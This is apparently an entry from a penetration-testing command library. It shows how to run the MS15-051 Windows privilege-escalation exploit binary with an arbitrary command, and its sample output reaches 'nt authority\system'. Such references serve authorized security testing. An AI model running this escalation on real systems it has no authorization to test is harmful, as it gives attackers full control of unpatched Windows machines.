---
id: ff7eae46-654a-4251-983c-831f322fbd8d
name: Execute MS15-051.exe from a Command Shell
type: command
executor: command_prompt
data: cmd.exe /c ms15-051x64.exe "$_COMMAND"
output: "C:\\>cmd.exe /c ms15-051.exe \"whoami > \"                    \ncmd.exe /c\
  \ ms15-051.exe \"whoami\"\n[#] ms15-051 fixed by zcgonvh                       \
  \                                                     \n[!] process with pid: 1616\
  \ created.                                                                     \
  \ \n==============================\nnt authority\\system"
created_at: '2019-12-05T23:29:37.824954+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Execute MS15-051.exe from a Command Shell

```command_prompt
cmd.exe /c ms15-051x64.exe "$_COMMAND"
```

## Expected Output

```
C:\>cmd.exe /c ms15-051.exe "whoami > "                    
cmd.exe /c ms15-051.exe "whoami"
[#] ms15-051 fixed by zcgonvh                                                                            
[!] process with pid: 1616 created.                                                                      
==============================
nt authority\system
```


